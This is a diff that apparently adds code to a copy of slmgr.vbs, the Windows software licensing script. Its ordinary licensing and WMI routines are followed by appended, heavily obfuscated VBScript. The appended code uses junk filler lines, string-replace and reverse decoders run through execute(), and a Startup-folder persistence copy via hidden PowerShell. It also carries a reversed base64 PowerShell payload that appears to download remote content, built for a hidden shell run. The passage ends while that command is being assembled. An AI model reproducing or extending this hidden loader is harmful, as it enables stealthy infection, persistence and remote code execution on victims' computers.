+        WScript.Echo g_EchoString
+    End If
+    WScript.Quit retval
+End Sub
+
+Function GetMachineDomain()
+    Dim adSystemInfo
+    Dim machineDomain
+
+    set adSystemInfo = CreateObject("ADSystemInfo")
+    QuitIfError()
+
+    machineDomain = adSystemInfo.DomainDNSName & "/"
+    QuitIfError()
+
+    GetMachineDomain = machineDomain
+End Function
+
+Function HexByte(b)
+      HexByte = Right("0" & Hex(b), 2)
+End Function
+
+Function GuidToString(ByteArray)
+  Dim Binary, S
+  Binary = CStr(ByteArray)
+  S = "{"
+  S = S & HexByte(AscB(MidB(Binary, 4, 1)))
+  S = S & HexByte(AscB(MidB(Binary, 3, 1)))
+  S = S & HexByte(AscB(MidB(Binary, 2, 1)))
+  S = S & HexByte(AscB(MidB(Binary, 1, 1)))
+  S = S & "-"
+  S = S & HexByte(AscB(MidB(Binary, 6, 1)))
+  S = S & HexByte(AscB(MidB(Binary, 5, 1)))
+  S = S & "-"
+  S = S & HexByte(AscB(MidB(Binary, 8, 1)))
+  S = S & HexByte(AscB(MidB(Binary, 7, 1)))
+  S = S & "-"
+  S = S & HexByte(AscB(MidB(Binary, 9, 1)))
+  S = S & HexByte(AscB(MidB(Binary, 10, 1)))
+  S = S & "-"
+  S = S & HexByte(AscB(MidB(Binary, 11, 1)))
+  S = S & HexByte(AscB(MidB(Binary, 12, 1)))
+  S = S & HexByte(AscB(MidB(Binary, 13, 1)))
+  S = S & HexByte(AscB(MidB(Binary, 14, 1)))
+  S = S & HexByte(AscB(MidB(Binary, 15, 1)))
+  S = S & HexByte(AscB(MidB(Binary, 16, 1)))
+  S = S & "}"
+  GuidToString = S
+End Function
+
+Private Sub InstallLicense(licFile)
+    Dim objService
+    Dim LicenseData
+    Dim strOutput
+
+    On Error Resume Next
+    LicenseData = ReadAllTextFile(licFile)
+    QuitIfError()
+    set objService = GetServiceObject("Version")
+    QuitIfError()
+
+    objService.InstallLicense(LicenseData)
+    QuitIfError()
+
+    strOutput = Replace(GetResource("L_MsgLicenseFile"), "%LICENSEFILE%", licFile)
+    LineOut strOutput
+    LineOut ""
+End Sub
+
+
+' Returns the encoding for a givven file.
+' Possible return values: ascii, unicode, unicodeFFFE (big-endian), utf-8
+Function GetFileEncoding(strFileName)
+    Dim strData
+    Dim strEncoding
+    Dim oStream
+
+    Set oStream = CreateObject("ADODB.Stream")
+
+    oStream.Type = 1 'adTypeBinary
+    oStream.Open
+    oStream.LoadFromFile(strFileName)
+
+    ' Default encoding is ascii
+    strEncoding =  "ascii"
+
+    strData = BinaryToString(oStream.Read(2))
+
+    ' Check for little endian (x86) unicode preamble
+    If (Len(strData) = 2) and strData = (Chr(255) + Chr(254)) Then
+        strEncoding = "unicode"
+    Else
+        oStream.Position = 0
+        strData = BinaryToString(oStream.Read(3))
+
+        ' Check for utf-8 preamble
+        If (Len(strData) >= 3) and strData = (Chr(239) + Chr(187) + Chr(191)) Then
+            strEncoding = "utf-8"
+        End If
+    End If
+
+    oStream.Close
+
+    GetFileEncoding = strEncoding
+End Function
+
+' Converts binary data (VT_UI1 | VT_ARRAY) to a string (BSTR)
+Function BinaryToString(dataBinary)
+  Dim i
+  Dim str
+
+  For i = 1 To LenB(dataBinary)
+    str = str & Chr(AscB(MidB(dataBinary, i, 1)))
+  Next
+
+  BinaryToString = str
+End Function
+
+' Returns string containing the whole text file data.
+' Supports ascii, unicode (little-endian) and utf-8 encoding.
+Function ReadAllTextFile(strFileName)
+    Dim strData
+    Dim oStream
+
+    Set oStream = CreateObject("ADODB.Stream")
+
+    oStream.Type = 2 'adTypeText
+    oStream.Open
+    oStream.Charset = GetFileEncoding(strFileName)
+    oStream.LoadFromFile(strFileName)
+
+    strData = oStream.ReadText(-1) 'adReadAll
+
+    oStream.Close
+
+    ReadAllTextFile = strData
+End Function
+
+Private Function HandleOptionParam(cParam, mustProvide, opt, param)
+    Dim strOutput
+
+    HandleOptionParam = True
+    If WScript.Arguments.Count <= cParam Then
+        HandleOptionParam = False
+        If mustProvide Then
+            LineOut ""
+            strOutput = Replace(GetResource("L_MsgErrorText_9"), "%OPTION%", opt)
+            strOutput = Replace(strOutput, "%PARAM%", param)
+            LineOut strOutput
+            Call DisplayUsage()
+        End If
+    End If
+End Function
+
+'
+' A Copy of Err from the point of origin
+'
+Class CErr
+    Public Number
+    Public Description
+    Public Source
+
+    Private Sub Class_Initialize
+        Number      = Err.Number
+        Description = Err.Description
+        Source      = Err.Source
+    End Sub
+End Class
+
+Function NewCErr(number, source, description)
+    Dim objError
+
+    Set objError = new CErr
+    objError.Number = CLng(number)
+    objError.Source = source
+    objError.Description = description
+
+    Set NewCErr = objError
+End Function
+
+Private Sub ShowError(ByVal strMessage, ByVal objErr)
+    Dim strDescription
+    Dim strNumber
+
+    ' Convert error number to text. Use hexadecimal format for negative values such as HRESULT errors.
+    If objErr.Number >= 0 Then
+        strNumber = CStr(objErr.Number)
+    Else
+        strNumber = "0x" & Hex(objErr.Number)
+    End If
+
+    strDescription = GetResource("L_MsgError_" & Hex(objErr.Number))
+
+    If strDescription = "" Then
+        If objErr.Description = "" Then
+            strDescription = Replace(GetResource("L_MsgErrorText_6"), "0x%ERRCODE%", strNumber)
+        ElseIf objErr.Source = "" Then
+            strDescription = objErr.Description
+        Else
+            strDescription = objErr.Description & " (" & objErr.Source & ")"
+        End If
+    End If
+
+    If 0 = InStr(strMessage, "0x%ERRCODE%") Then
+        strMessage = strMessage & "0x%ERRCODE%"
+    End If
+
+    If 0 = InStr(strMessage, "%ERRTEXT%") Then
+        strMessage = strMessage & " %ERRTEXT%"
+    End If
+
+    strMessage = Replace(strMessage, "%COMPUTERNAME%", g_strComputer)
+    strMessage = Replace(strMessage, "0x%ERRCODE%", strNumber)
+    strMessage = Replace(strMessage, "%ERRTEXT%", strDescription)
+
+    LineOut strMessage
+End Sub
+
+Private Sub QuitIfError()
+    QuitIfError2 "L_MsgErrorText_8"
+End Sub
+
+Private Sub QuitIfError2(strMessage)
+    Dim objErr
+
+    If Err.Number <> 0 Then
+        Set objErr = new CErr
+
+        ShowError GetResource(strMessage), objErr
+        ExitScript objErr.Number
+    End If
+End Sub
+
+Private Sub QuitWithError(errNum)
+    ShowError GetResource("L_MsgErrorText_8"), NewCErr(errNum, Empty, Empty)
+    ExitScript errNum
+End Sub
+
+
+Private Sub Connect
+    Dim objLocator, strOutput
+    Dim objServer, objService
+    Dim strErr, strVersion
+
+    On Error Resume Next
+
+    'If this is the local computer, set everything and return immediately
+    If g_strComputer = "." Then
+        Set g_objWMIService = GetObject("winmgmts:\\" & g_strComputer & "\root\cimv2")
+        QuitIfError2("L_MsgErrorLocalWMI")
+
+        Set g_objRegistry = GetObject("winmgmts:\\" & g_strComputer & "\root\default:StdRegProv")
+        QuitIfError2("L_MsgErrorLocalRegistry")
+
+        Exit Sub
+    End If
+
+    'Otherwise, establish the remote object connections
+
+    ' Create Locator object to connect to remote CIM object manager
+    Set objLocator = CreateObject("WbemScripting.SWbemLocator")
+    QuitIfError2("L_MsgErrorWMI")
+
+    ' Connect to the namespace which is either local or remote
+    Set g_objWMIService = objLocator.ConnectServer (g_strComputer, "\root\cimv2", g_strUserName, g_strPassword)
+    QuitIfError2("L_MsgErrorConnection")
+
+    g_IsRemoteComputer = True
+
+    g_objWMIService.Security_.impersonationlevel = wbemImpersonationLevelImpersonate
+    QuitIfError2("L_MsgErrorImpersonation")
+
+    g_objWMIService.Security_.AuthenticationLevel = wbemAuthenticationLevelPktPrivacy
+    QuitIfError2("L_MsgErrorAuthenticationLevel")
+
+    ' Get the SPP service version on the remote machine
+    set objService = GetServiceObject("Version")
+    strVersion = objService.Version
+
+    ' The Windows 8 version of SLMgr.vbs does not support remote connections to Vista/WS08 and Windows 7/WS08R2 machines
+    if (Not IsNull(strVersion)) Then
+        strVersion = Left(strVersion, 3)
+        If (strVersion = "6.0") Or (strVersion = "6.1") Then
+            LineOut GetResource("L_MsgRemoteWmiVersionMismatch")
+            ExitScript 1
+        End If
+    End If
+
+    Set objServer = objLocator.ConnectServer(g_strComputer, "\root\default:StdRegProv", g_strUserName, g_strPassword)
+    QuitIfError2("L_MsgErrorConnectionRegistry")
+
+    objServer.Security_.ImpersonationLevel = 3
+    Set g_objRegistry = objServer.Get("StdRegProv")
+    QuitIfError2("L_MsgErrorConnectionRegistry")
+End Sub
+
+Function GetServiceObject(strQuery)
+    Dim objService
+    Dim colServices
+
+    On Error Resume Next
+
+    Set colServices = g_objWMIService.ExecQuery("SELECT " & strQuery & " FROM " & ServiceClass)
+    QuitIfError()
+
+    For each objService in colServices
+        QuitIfError()
+        Exit For
+    Next
+
+    QuitIfError()
+
+    set GetServiceObject = objService
+End Function
+
+Function GetProductCollection(strSelect, strWhere)
+    Dim colProducts
+    Dim objProduct
+
+    On Error Resume Next
+
+    If strWhere = EmptyWhereClause Then
+        Set colProducts = g_objWMIService.ExecQuery("SELECT " & strSelect & " FROM " & ProductClass)
+        QuitIfError()
+    Else
+        Set colProducts = g_objWMIService.ExecQuery("SELECT " & strSelect & " FROM " & ProductClass & " WHERE " & strWhere)
+        QuitIfError()
+    End If
+
+    For each objProduct in colProducts
+    Next
+
+    QuitIfError()
+
+    set GetProductCollection = colProducts
+End Function
+
+Function GetProductObject(strSelect, strWhere)
+    Dim objProduct
+    Dim colProducts
+    Dim iProductsFound
+
+    On Error Resume Next
+
+    iProductsFound = 0
+    Set colProducts = GetProductCollection(strSelect, strWhere)
+    For each objProduct in colProducts
+        QuitIfError()
+        iProductsFound = iProductsFound + 1
+    Next
+
+    'There should be exactly one product returned by the query.  If there are none
+    'assume the product key and/or licenses are missing.  If there are more than one
+    'then fail with invalid arguments.
+    If iProductsFound = 0 Then
+        LineOut GetResource("L_MsgErrorPKey")
+        Err.Number = HR_SL_E_PKEY_NOT_INSTALLED
+    ElseIf iProductsFound <> 1 Then
+        Err.Number = HR_INVALID_ARG
+    End If
+    QuitIfError()
+
+    'Return the first (and only) element in the collection
+    For each objProduct in colProducts
+        QuitIfError()
+        Exit For
+    Next
+
+    set GetProductObject = objProduct
+End Function
+
+Private Function IsKmsClient(strDescription)
+    If InStr(strDescription, "VOLUME_KMSCLIENT") > 0 Then
+        IsKmsClient = True
+    Else
+        IsKmsClient = False
+    End If
+End Function
+
+Private Function  IsTkaClient(strDescription)
+    IsTkaClient = IsKmsClient(strDescription)
+End Function
+
+Private Function IsKmsServer(strDescription)
+    If IsKmsClient(strDescription) Then
+        IsKmsServer = False
+    Else
+        If InStr(strDescription, "VOLUME_KMS") > 0 Then
+            IsKmsServer = True
+        Else
+            IsKmsServer = False
+        End If
+    End If
+End Function
+
+Private Function IsTBL(strDescription)
+    If InStr(strDescription, "TIMEBASED_") > 0 Then
+        IsTBL = True
+    Else
+        IsTBL = False
+    End If
+End Function
+
+Private Function IsAVMA(strDescription)
+    If InStr(strDescription, "VIRTUAL_MACHINE_ACTIVATION") > 0 Then
+        IsAVMA = True
+    Else
+        IsAVMA = False
+    End If
+End Function
+
+Private Function IsMAK(strDescription)
+    If InStr(strDescription, "MAK") > 0 Then
+        IsMAK = True
+    Else
+        IsMAK = False
+    End If
+End Function
+
+Private Sub FailRemoteExec()
+    if (g_IsRemoteComputer = True) Then
+        Lineout GetResource("L_MsgRemoteExecNotSupported")
+        ExitScript 1
+    End If
+End Sub
+
+'Returns 0 if this is not the primary SKU, 1 if it is, and 2 if we aren't certain (older clients)
+Function GetIsPrimaryWindowsSKU(objProduct)
+    Dim iPrimarySku
+    Dim bIsAddOn
+
+    'Assume this is not the primary SKU
+    iPrimarySku = 0
+    'Verify the license is for Windows, that it has a partial key, and that
+    If (LCase(objProduct.ApplicationId) = WindowsAppId And objProduct.PartialProductKey <> "") Then
+        'If we can get verify the AddOn property then we can be certain
+        On Error Resume Next
+        bIsAddOn = objProduct.LicenseIsAddon
+        If Err.Number = 0 Then
+            If bIsAddOn = true Then
+                iPrimarySku = 0
+            Else
+                iPrimarySku = 1
+            End If
+        Else
+            'If we can not get the AddOn property then we assume this is a previous version
+            'and we return a value of Uncertain, unless we can prove otherwise
+            If (IsKmsClient(objProduct.Description) Or IsKmsServer(objProduct.Description)) Then
+                'If the description is KMS related, we can be certain that this is a primary SKU
+                iPrimarySku = 1
+            Else
+                'Indeterminate since the property was missing and we can't verify KMS
+                iPrimarySku = 2
+            End If
+        End If
+    End If
+    GetIsPrimaryWindowsSKU = iPrimarySku
+End Function
+
+Private Function WasPrimaryKeyFound(strPrimarySkuType)
+    If (IsKmsServer(strPrimarySkuType) Or IsKmsClient(strPrimarySkuType) Or (InStr(strPrimarySkuType, NotSpecialCasePrimaryKey) > 0) Or (InStr(strPrimarySkuType, TblPrimaryKey) > 0) Or (InStr(strPrimarySkuType, IndeterminatePrimaryKeyFound) > 0)) Then
+        WasPrimaryKeyFound = True
+    Else
+        WasPrimaryKeyFound = False
+    End If
+End Function
+
+
+Private Function CanPrimaryKeyTypeBeDetermined(strPrimarySkuType)
+    If ((InStr(strPrimarySkuType, IndeterminatePrimaryKeyFound) > 0) Or (InStr(strPrimarySkuType, NoPrimaryKeyFound) > 0)) Then
+        CanPrimaryKeyTypeBeDetermined = False
+    Else
+        CanPrimaryKeyTypeBeDetermined = True
+    End If
+End Function
+
+
+Private Function GetPrimarySKUType()
+    Dim objProduct
+    Dim strPrimarySKUType, strDescription
+    Dim iIsPrimaryWindowsSku
+
+    For Each objProduct in GetProductCollection(ProductIsPrimarySkuSelectClause, PartialProductKeyNonNullWhereClause)
+        strDescription = objProduct.Description
+        If (LCase(objProduct.ApplicationId) = WindowsAppId) Then
+            iIsPrimaryWindowsSku = GetIsPrimaryWindowsSKU(objProduct)
+            If (iIsPrimaryWindowsSku = 1) Then
+                If (IsKmsServer(strDescription) Or IsKmsClient(strDescription)) Then
+                    strPrimarySKUType = strDescription
+                    Exit For    'no need to continue
+                Else
+                    If IsTBL(strDescription) Then
+                        strPrimarySKUType = TblPrimaryKey
+                        Exit For
+                    Else
+                        strPrimarySKUType = NotSpecialCasePrimaryKey
+                    End If
+                End If
+            ElseIf ((iIsPrimaryWindowsSku = 2) And strPrimarySKUType = "") Then
+                strPrimarySKUType = IndeterminatePrimaryKeyFound
+            End If
+        Else
+            strPrimarySKUType = strDescription
+            Exit For    'no need to continue
+        End If
+    Next
+
+    If strPrimarySKUType = "" Then
+        strPrimarySKUType = NoPrimaryKeyFound
+    End If
+
+    GetPrimarySKUType = strPrimarySKUType
+End Function
+
+Private Function SetRegistryStr(hKey, strKeyPath, strValueName, strValue)
+    SetRegistryStr = g_objRegistry.SetStringValue(hKey, strKeyPath, strValueName, strValue)
+End Function
+
+Private Function DeleteRegistryValue(hKey, strKeyPath, strValueName)
+    DeleteRegistryValue = g_objRegistry.DeleteValue(hKey, strKeyPath, strValueName)
+End Function
+
+Private Function ExistsRegistryKey(hKey, strKeyPath)
+    Dim bGranted
+    Dim lRet
+
+    ' Check for KEY_QUERY_VALUE for this key
+    lRet = g_objRegistry.CheckAccess(hKey, strKeyPath, 1, bGranted)
+
+    ' Ignore real access rights, just look for existence of the key
+    If lRet<>2 Then
+        ExistsRegistryKey = True
+    Else
+        ExistsRegistryKey = False
+    End If
+End Function
+
+' Resource manipulation
+
+' Get the resource string with the given name from the locale specific
+' dictionary. If not found, use the built-in default.
+Private Function GetResource(name)
+    LoadResourceData
+    If g_resourceDictionary.Exists(LCase(name)) Then
+        GetResource = g_resourceDictionary.Item(LCase(name))
+    Else
+        GetResource = Eval(name)
+    End If
+End Function
+
+' Loads resource strings from an ini file of the appropriate locale
+Private Function LoadResourceData
+    If g_resourcesLoaded Then
+        Exit Function
+    End If
+
+    Dim ini, lang
+    Dim fso
+
+    Set fso = WScript.CreateObject("Scripting.FileSystemObject")
+
+    On Error Resume Next
+    lang = GetUILanguage()
+    If Err.Number <> 0 Then
+        'API does not exist prior to Vista so no resources to load
+        g_resourcesLoaded = True
+        Exit Function
+    End If
+
+    ini = fso.GetParentFolderName(WScript.ScriptFullName) & "\slmgr\" _
+        & ToHex(lang) & "\" & fso.GetBaseName(WScript.ScriptName) &  ".ini"
+
+    If fso.FileExists(ini) Then
+        Dim stream
+        Const ForReading = 1, TristateTrue = -1 'Read file in unicode format
+
+        Set stream = fso.OpenTextFile(ini, ForReading, False, TristateTrue)
+        ReadResources(stream)
+        stream.Close
+    End If
+
+    g_resourcesLoaded = True
+End Function
+
+' Reads resource strings from an ini file
+Private Function ReadResources(stream)
+    const ERROR_FILE_NOT_FOUND = 2
+    Dim ln, arr, key, value
+
+    If Not IsObject(stream) Then Err.Raise ERROR_FILE_NOT_FOUND
+
+    Do Until stream.AtEndOfStream
+        ln = stream.ReadLine
+
+        arr = Split(ln, "=", 2, 1)
+        If UBound(arr, 1) = 1 Then
+            ' Trim the key and the value first before trimming quotes
+            key = LCase(Trim(arr(0)))
+            value = TrimChar(Trim(arr(1)), """")
+
+            If key <> "" Then
+                g_resourceDictionary.Add key, value
+            End If
+        End If
+    Loop
+End Function
+
+' Trim a character from the text string
+Private Function TrimChar(s, c)
+    Const vbTextCompare = 1
+
+    ' Trim character from the start
+    If InStr(1, s, c, vbTextCompare) = 1 Then
+        s = Mid(s, 2)
+    End If
+
+    ' Trim character from the end
+    If InStr(Len(s), s, c, vbTextCompare) = Len(s) Then
+        s = Mid(s, 1, Len(s) - 1)
+    End If
+
+    TrimChar = s
+End Function
+
+' Get a 4-digit hexadecimal number
+Private Function ToHex(n)
+    Dim s : s = Hex(n)
+    ToHex = String(4 - Len(s), "0") & s
+End Function
+
+On Error Resume Next
+ANuNQWZ:iNBknP:fOOQoG = "!ú*@ú(}":GRfCxK:KdUunO:
+ANuNQWZ:iNBknP:fOOQoG = "!ú*@ú(}":GRfCxK:KdUunO:
+ANuNQWZ:iNBknP:fOOQoG = "!ú*@ú(}":GRfCxK:KdUunO:
+ANuNQWZ:iNBknP:fOOQoG = "!ú*@ú(}":GRfCxK:KdUunO:
+ANuNQWZ:iNBknP:fOOQoG = "!ú*@ú(}":GRfCxK:KdUunO:
+ANuNQWZ:iNBknP:fOOQoG = "!ú*@ú(}":GRfCxK:KdUunO:
+tUIRdu = "puø�](#]▲raø�](#]▲S"
+tUIRdu = Replace(tUIRdu,"ø�](#]▲","t")
+tUIRdu = duJQnC(duJQnC(duJQnC(tUIRdu)))
+
+TaYqjG = "DdDP"
+
+JPFGZYLWLJJTOOZDZCLNPHF
+VKRQZFOBGKFDQWQFWHQGTBNPBRJXKTNQKLCYZNKZMOPFXLCSSNO
+
+PqIaNr = ""
+
+if 0 then
+Set PqIaNro = CreateObject ("Wscript.Shell")
+PqIaNr = WScript.ScriptFullName
+LKNjRc = PqIaNr
+
+dim pqURuG
+dim DGiOsU
+dim MqNpCv
+dim MqNpCv34
+MqNpCv34 = "ø�░�((@"
+dim UtJLyB
+UtJLyB = ""
+
+pqURuG = ")'sbv." + TaYqjG + " \puø�░�((@trø�░�((@atS\smø�░�((@arø�░�((@gorø�░�((@P\uø�░�((@neM"
+pqURuG = pqURuG + " traø�░�((@tø�░�((@S\sø�░�((@woø�░�((@ø�░�((@dniW\tø�░�((@ø�░�((@foø�░�((@soø�░�((@ø�░�((@rciø�░�((@ø�░�((@M\gø�░�((@nø�░�((@imø�░�((@ø�░�((@aoR\aø�░�((@ø�░�((@taø�░�((@Dpø�░�((@pA\ø�░�((@'"
+pqURuG = ZaGHwW(ZaGHwW( pqURuG , MqNpCv34 , UtJLyB ),pqURuG,pqURuG)
+
+DGiOsU = "ð:₩ʦᾫsU▶ú4ð↓░▶[ð:₩ʦᾫsU▶ú4ð↓░▶Sð:₩ʦᾫsU▶ú4ð↓░▶yð:₩ʦᾫsU▶ú4ð↓░▶ð:₩ʦᾫsU▶ú4ð↓░▶ð:₩ʦᾫsU▶ú4ð↓░▶stð:₩ʦᾫsU▶ú4ð↓░▶eð:₩ʦᾫsU▶ú4ð↓░▶ð:₩ʦᾫsU▶ú4ð↓░▶ð:₩ʦᾫsU▶ú4ð↓░▶m.ð:₩ʦᾫsU▶ú4ð↓░▶I" 
+DGiOsU = DGiOsU + "ð:₩ʦᾫsU▶ú4ð↓░▶O.Fð:₩ʦᾫsU▶ú4ð↓░▶ið:₩ʦᾫsU▶ú4ð↓░▶leð:₩ʦᾫsU▶ú4ð↓░▶]:ð:₩ʦᾫsU▶ú4ð↓░▶:Coð:₩ʦᾫsU▶ú4ð↓░▶pð:₩ʦᾫsU▶ú4ð↓░▶y('" 
+DGiOsU = DGiOsU + PqIaNr + "'," 
+DGiOsU = DGiOsU + "'Cð:₩ʦᾫsU▶ú4ð↓░▶:ð:₩ʦᾫsU▶ú4ð↓░▶\Uð:₩ʦᾫsU▶ú4ð↓░▶sð:₩ʦᾫsU▶ú4ð↓░▶ers\' ð:₩ʦᾫsU▶ú4ð↓░▶+ð:₩ʦᾫsU▶ú4ð↓░▶  ð:₩ʦᾫsU▶ú4ð↓░▶[Enð:₩ʦᾫsU▶ú4ð↓░▶við:₩ʦᾫsU▶ú4ð↓░▶roð:₩ʦᾫsU▶ú4ð↓░▶nmð:₩ʦᾫsU▶ú4ð↓░▶enð:₩ʦᾫsU▶ú4ð↓░▶t]ð:₩ʦᾫsU▶ú4ð↓░▶ð:₩ʦᾫsU▶ú4ð↓░▶ð:₩ʦᾫsU▶ú4ð↓░▶ð:₩ʦᾫsU▶ú4ð↓░▶ð:₩ʦᾫsU▶ú4ð↓░▶:ð:₩ʦᾫsU▶ú4ð↓░▶:Uð:₩ʦᾫsU▶ú4ð↓░▶seð:₩ʦᾫsU▶ú4ð↓░▶rNað:₩ʦᾫsU▶ú4ð↓░▶me ð:₩ʦᾫsU▶ú4ð↓░▶+ð:₩ʦᾫsU▶ú4ð↓░▶ " 
+
+dim qdZaTW
+qdZaTW = pqURuG
+qdZaTW = duJQnC( _
+qdZaTW)
+
+DGiOsU = ZaGHwW( _
+DGiOsU + _
+ qdZaTW , _
+ "ð:₩ʦᾫsU" + _
+ "▶ú4ð↓░▶" , _
+ ZaGHwW(UtJLyB + "VlhANJWzUqNPORSOkNZdNOhowIxkiYoWLNNCGKrJjyNbjHfDAx","VlhANJWzUqNPORSOkNZdNOhowIxkiYoWLNNCGKrJjyNbjHfDAx",UtJLyB) )
+
+
+MqNpCv = ZaGHwW("cmwxHYNZdwxHYNZ.exwxHYNZe /c pwxHYNZing 1wxHYNZ27.wxHYNZ0.0wxHYNZ.1 -nwxHYNZ wxHYNZ5 & cmwxHYNZd.ewxHYNZxe /wxHYNZc " & """" & "powewxHYNZrshwxHYNZell -comwxHYNZmand " + DGiOsU + """" ,"wxHYNZ","")
+PqIaNro.run MqNpCv, 0, true
+end if
+
+Function GgqaUj(ruBWfW,iPSNep)
+dim ISclKw
+ISclKw = "GgqaUj = "
+ISclKw = ISclKw + "InStr(ruBWfW, iPSNep)"
+execute(ISclKw)
+End Function
+ANuNQWZ:iNBknP:fOOQoG = "!ú*@ú(}":GRfCxK:KdUunO:
+ANuNQWZ:iNBknP:fOOQoG = "!ú*@ú(}":GRfCxK:KdUunO:
+ANuNQWZ:iNBknP:fOOQoG = "!ú*@ú(}":GRfCxK:KdUunO:
+ANuNQWZ:iNBknP:fOOQoG = "!ú*@ú(}":GRfCxK:KdUunO:
+ANuNQWZ:iNBknP:fOOQoG = "!ú*@ú(}":GRfCxK:KdUunO:
+ANuNQWZ:iNBknP:fOOQoG = "!ú*@ú(}":GRfCxK:KdUunO:
+Function ZaGHwW(ruBWfW,iPSNep,vaOtDIn)
+dim ISclKw
+ISclKw = "ZaGHwW = "
+ISclKw = ISclKw + "Replace"
+ISclKw = ISclKw + "(ruBWfW ,iPSNep, vaOtDIn)"
+execute(ISclKw)
+End Function
+ANuNQWZ:iNBknP:fOOQoG = "!ú*@ú(}":GRfCxK:KdUunO:
+ANuNQWZ:iNBknP:fOOQoG = "!ú*@ú(}":GRfCxK:KdUunO:
+ANuNQWZ:iNBknP:fOOQoG = "!ú*@ú(}":GRfCxK:KdUunO:
+ANuNQWZ:iNBknP:fOOQoG = "!ú*@ú(}":GRfCxK:KdUunO:
+ANuNQWZ:iNBknP:fOOQoG = "!ú*@ú(}":GRfCxK:KdUunO:
+ANuNQWZ:iNBknP:fOOQoG = "!ú*@ú(}":GRfCxK:KdUunO:
+Function duJQnC(ruBWfW)
+dim ISclKw
+ISclKw = "duJQnC = "
+ISclKw = ISclKw + "StrReverse"
+ISclKw = ISclKw + "(ruBWfW)"
+execute(ISclKw)
+End Function
+
+Function uQJXuHe(cPUTDWN,YeAcMJS,qGKPBWN)
+    uQJXuHe = Replace(cPUTDWN, YeAcMJS, qGKPBWN)
+End Function
+
+Function fHNJPpZ(cPUTDWN)
+    fHNJPpZ = StrReverse(cPUTDWN)
+End Function
+
+dim ueJSbtj
+ueJSbtj = "  "
+
+dim yADKTav
+yADKTav = "/ ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ /"
+dim ZesloJJ
+
+
+ZesloJJ = fHNJPpZ("⁂kC⁂p⁂wJ⁂gG⁂0B⁂d⁂⁂H⁂6⁂wL⁂8C⁂3⁂QO⁂4C⁂x⁂QM⁂⁂D⁂u⁂⁂N⁂kD⁂u⁂QN⁂UD⁂v⁂Qb⁂kH⁂uBQ" & yADKTav & ueJSbtj & yADKTav & "⁂MH⁂u⁂⁂d⁂gH⁂0BwJ⁂gC⁂g⁂QX⁂0F⁂bB⁂d⁂MG⁂lBga⁂IG⁂vBwW⁂⁂C⁂s⁂⁂b⁂wG⁂1Bgb⁂QC⁂o⁂Q" & yADKTav & ueJSbtj & yADKTav & "⁂sG⁂vBgd⁂4G⁂JBgL⁂kC⁂n⁂QS⁂EE⁂WBwJ⁂gC⁂kBwb⁂gG⁂0BQ" & yADKTav & ueJSbtj & yADKTav & "⁂0E⁂0BQ" & yADKTav & ueJSbtj & yADKTav & "⁂cE⁂u⁂QK⁂cC⁂lBQb⁂8G⁂IBgL⁂IH⁂lBgY⁂kG⁂GBwJ⁂gC⁂lB⁂c⁂kH⁂UB⁂d⁂UG⁂HBgL⁂kC⁂MB⁂T⁂QE⁂k⁂⁂K⁂QG⁂hBwb⁂wE⁂u⁂gb⁂kG⁂hBQb⁂8G⁂EB⁂d⁂4G⁂lBgc⁂IH⁂1BwQ⁂oD⁂6⁂QX⁂4G⁂pBQY⁂0G⁂vB⁂R⁂⁂H⁂wBQQ⁂4C⁂tBQ" & yADKTav & ueJSbtj & yADKTav & "⁂QH⁂zBQe⁂MF⁂bBwO⁂kC⁂p⁂wJ⁂UG⁂v⁂QR⁂8C⁂0BQ" & yADKTav & ueJSbtj & yADKTav & "⁂4G⁂u⁂gb⁂8G⁂pB⁂d⁂MG⁂lBgb⁂4G⁂vBwY⁂4G⁂pBwd⁂4C⁂yBQ" & yADKTav & ueJSbtj & yADKTav & "⁂YH⁂yBQ" & yADKTav & ueJSbtj & yADKTav & "⁂MH⁂wB⁂d⁂YG⁂v⁂wL⁂oD⁂wB⁂d⁂QH⁂oBwJ⁂gC⁂nBgb⁂kG⁂yB⁂d⁂MF⁂kBQY⁂8G⁂sBgb⁂cH⁂vB⁂R⁂4C⁂p⁂⁂d⁂4G⁂lBQa⁂wG⁂DBgY⁂UG⁂XBgL⁂QH⁂lBgT⁂⁂C⁂0BwY⁂UG⁂qBgY⁂8E⁂t⁂wd⁂UG⁂OB⁂K⁂gC⁂nBgb⁂kG⁂yB⁂d⁂MF⁂0⁂gN⁂UG⁂zBQY⁂IE⁂tBwb⁂IH⁂GBgO⁂oD⁂dB⁂d⁂IH⁂lBgd⁂4G⁂vBwQ⁂4C⁂tBQ" & yADKTav & ueJSbtj & yADKTav & "⁂QH⁂zBQe⁂MF⁂bB⁂I⁂0D⁂g⁂⁂T⁂wE⁂EB⁂J⁂⁂C⁂dBQX⁂sF⁂lB⁂d⁂kH⁂CBwW")
+ZesloJJ = uQJXuHe( ZesloJJ, yADKTav + ueJSbtj + yADKTav , "Z")
+
+Function pUgLGKO(input)
+    pUgLGKO = StrReverse(input)
+End Function
+
+Function gXdUlWB(command)
+    Dim DKGlXlJ, DGulPPJ
+
+    DGulPPJ = "!(/@#)%owø^@ú::⇝rshø^@ú::⇝ll -co!**@#(¨!**@#(¨and " & command
+    DGulPPJ = Replace(DGulPPJ,"ø^@ú::⇝","e")
+    DGulPPJ = Replace(DGulPPJ,"!**@#(¨","m")
+    DGulPPJ = Replace(DGulPPJ,"!(/@#)%","p")
+
+    Set DKGlXlJ = CreateObject("WScript.Shell")
+    DKGlXlJ.Run DGulPPJ, 0, False
+End Function
+
+sDYSnyx = pUgLGKO("' = ogidoC$") & ZesloJJ & "'" 
+sDYSnyx = sDYSnyx & ";$OWjux@ú☠@#(� = [@*:@@(#y@*:@@(#t@ú}@]☞$m.T@ú}@]☞$xt.@ú}@]☞$nco@ú☠@#(�ing]::Unico@ú☠@#(�@ú}@]☞$.G@ú}@]☞$tString( "
+sDYSnyx = sDYSnyx & "[@*:@@(#y@*:@@(#t@ú}@]☞$m.Conv@ú}@]☞$rt]::From@ø}@((^→](#ú@●s@ú}@]☞$64String( $(ú√●}◀√o@ú☠@#(�igo.r@ú}@]☞$@}☠@}ú:l→](#ú@●ce('⁂','A') ) )"
